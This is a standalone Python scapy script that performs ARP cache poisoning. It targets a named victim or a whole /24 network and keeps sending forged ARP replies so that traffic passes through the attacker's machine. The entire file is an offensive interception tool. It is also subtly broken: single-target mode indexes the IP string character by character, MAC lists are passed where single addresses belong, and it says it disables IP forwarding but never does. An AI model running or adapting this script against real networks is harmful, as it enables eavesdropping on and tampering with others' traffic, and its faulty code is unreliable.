from scapy.all import *
import sys
import os
import time
import argparse


flag = False
def scan(ip):

    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)

    ans, unans = srp(request, timeout=2, retry=1)
    result = []

    for sent, received in ans:
        result.append(received.hwsrc)

    return result

try:
    interface = input("[*] Enter Desired Interface: ")
    victimIP = input("[*] Enter Victim IP: ")
    gatewayIP = input("[*] Enter Gateway IP: ")
except KeyboardInterrupt:
    print("\n[*] User Requested Shutdown")
    print("[*] Exiting...")
    sys.exit(1)
def enable_ipforwarding():
    path = "/proc/sys/net/ipv4/ip_forward"
    with open(path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(path, "w") as f:
        print(1, file=f)
enable_ipforwarding()
print("[*] Enabling IP Forwarding...\n")

print(victimIP)
if victimIP == "network":
    victimIP = scan(get_if_addr(conf.iface)+"/24")
    flag = True

def get_gwmac(IP):
    return getmacbyip(IP)
def get_mac(IP):
    result=[]
    if flag == True:
        for i in range(0, len(victimIP)):
            result.append(getmacbyip(victimIP[i]))
    else:
        result.append(getmacbyip(IP))
    return result
    

def reARP(): 
    print ("[*] Restoring Targets...")
    victimMAC = get_mac(victimIP)
    gatewayMAC = get_gwmac(gatewayIP)
    for i in range(0, len(victimMAC)):
        send(ARP(op=2, pdst=victimIP[i], psrc=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMAC), count=7)
        send(ARP(op=2, pdst=gatewayIP, psrc=victimIP[i], hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC[i]), count=7)
    print("[*] Disabling IP Forwarding...")
    print("[*] Shutting Down...")
    sys.exit(1)

def trick(gm, vm):
    for i in range(0, len(victimIP)):
        send(ARP(op=2, psrc=gatewayIP, pdst=victimIP[i], hwdst=vm))
        send(ARP(op=2, psrc=victimIP[i], pdst=gatewayIP, hwdst=gm))

def mitm():
    print(get_mac(victimIP))
    try:
        victimMAC = get_mac(victimIP)
    except Exception:
        print("[!] Couldn't Find Victim MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    try: 
        gatewayMAC = get_gwmac(gatewayIP)
    except Exception:
        print("[!] Couldn't Find Gateway MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    print("[*] Poisoning Targets...")
    while 1:
        try:
            trick(gatewayMAC, victimMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reARP()
            break

mitm()
